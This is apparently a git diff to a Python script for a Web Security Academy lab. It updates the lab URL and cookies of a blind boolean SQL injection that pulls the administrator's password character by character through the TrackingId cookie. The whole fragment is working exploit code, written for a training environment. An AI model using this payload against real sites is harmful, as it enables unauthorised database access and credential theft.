@@ -29,13 +29,13 @@ def makeSQLi():
     for position in range(1, 21):
         for character in characters:
             cookies = {
-                'TrackingId': f"0tYdW3tI0pJdmnVo' and (select substring(password,{position},1) from users where username='administrator') = '{character}'-- -",
-                'session': 'xkHwU4bggBmE0jiEHAXyOfgb60eemG'
+                'TrackingId': f"V1CL15KXQvlORptL' and (select substring(password,{position},1) from users where username='administrator') = '{character}'-- -",
+                'session': '23NIkcvFiXyjWMAcm411kVbA2K2QyF4S'
             }
 
             p1.status(f"TrackingId")
 
-            r = requests.get("https://0afd00540433ac10815cdf5003a0c05c.web-security-academy.net", cookies=cookies)
+            r = requests.get("https://0af4004804a9dbd1806b3f69003200f1.web-security-academy.net", cookies=cookies)
 
             if "Welcome back" in r.text:
                 password+=character
